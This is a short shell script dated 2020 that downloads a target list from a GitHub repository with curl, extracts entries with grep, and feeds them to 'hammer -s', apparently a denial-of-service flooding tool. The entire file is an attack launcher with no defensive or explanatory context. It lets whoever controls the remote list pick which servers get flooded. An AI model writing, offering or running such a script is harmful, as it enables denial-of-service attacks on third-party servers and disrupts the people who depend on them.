#!/bin/sh
# webgtx 2020
target=$(curl https://raw.githubusercontent.com/dxh-team/CDUW/master/targets.dat | grep "\-p")
hammer -s $target
